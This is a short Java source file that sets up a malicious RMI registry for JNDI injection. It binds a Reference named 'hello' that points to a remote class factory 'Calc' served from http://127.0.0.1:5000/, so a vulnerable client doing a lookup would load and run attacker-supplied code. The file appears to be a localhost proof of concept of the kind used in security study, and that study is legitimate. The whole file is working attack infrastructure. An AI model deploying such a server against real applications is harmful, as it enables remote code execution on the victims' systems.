package rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class ReferenceRMIServer {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);

        Reference reference = new Reference("Calc", "Calc", "http://127.0.0.1:5000/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("hello", referenceWrapper);

        System.out.println("Reference RMI Server start...");
        Thread.currentThread().join();
    }

}
